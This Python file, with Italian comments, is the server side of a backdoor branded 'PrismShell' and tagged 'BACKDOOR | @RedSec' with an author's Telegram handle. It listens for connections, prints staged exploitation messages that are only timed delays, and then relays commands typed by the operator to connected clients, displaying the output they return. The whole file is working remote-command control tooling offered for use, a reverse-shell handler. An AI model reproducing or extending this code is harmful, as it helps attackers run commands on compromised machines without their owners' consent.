import socket
from colorama import Fore
from datetime import datetime
import threading
import time as t

# Ottiene l'orario corrente
data = datetime.now().strftime("%H-%M-%S")

def handle_client(client_socket, client_address):
    """Funzione per gestire la comunicazione con il client."""
    print(Fore.RED + f"ATTACK INTERFACE | EXPLOITATION")
    print(Fore.GREEN + f"[+] Connection received from {client_address} at {data}")
    t.sleep(3)
    print(Fore.YELLOW + f"[!] Sending 4294 stage to {client_address}...")
    t.sleep(4)
    print(Fore.GREEN + "[+] Session 1 opened.\n")
    t.sleep(2)
    print(Fore.RED + "Prism Shell Control Panel\n")

    while True:
        try:
            # Invia un comando al client
            command = input(Fore.BLUE + "PrismShell>" + Fore.WHITE + " ")
            client_socket.send(command.encode('utf-8'))

            if command.lower() == 'exit':
                print(Fore.RED + f"[-] Exiting from session with {client_address}...")
                break

            # Riceve l'output del comando dal client
            output = client_socket.recv(4096).decode('utf-8')
            if output:
                print(output)
            else:
                print(Fore.RED + "[-] Connection closed by the client.")
                break

        except (ConnectionResetError, ConnectionAbortedError):
            print(Fore.RED + "[-] Connection lost.")
            break
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
            break

    client_socket.close()

def start_server(server_ip, server_port):
    """Funzione principale per avviare il server."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(5)  # Permette fino a 5 connessioni pendenti
    print(Fore.RED + """
============================================================
             _                   _          _ _ 
            (_)                 | |        | | |
  _ __  _ __ _ ___ _ __ ___  ___| |__   ___| | |
 | '_ \| '__| / __| '_ ` _ \/ __| '_ \ / _ \ | |
 | |_) | |  | \__ \ | | | | \__ \ | | |  __/ | |
 | .__/|_|  |_|___/_| |_| |_|___/_| |_|\___|_|_|
 | |                                            
 |_|                                            
 
 Made by: alchemy | telegram: @alchemy000 | BACKDOOR | @RedSec
 ============================================================                                         
 """)
    print(Fore.YELLOW + f"[!] Server listening on {server_ip}:{server_port}..."  + Fore.WHITE + " ")

    while True:
        client_socket, client_address = server_socket.accept()
        # Ogni client connesso viene gestito da un thread separato
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    SERVER_IP = '127.0.0.1'  # IP del server
    SERVER_PORT = 54000      # Porta del server
    start_server(SERVER_IP, SERVER_PORT)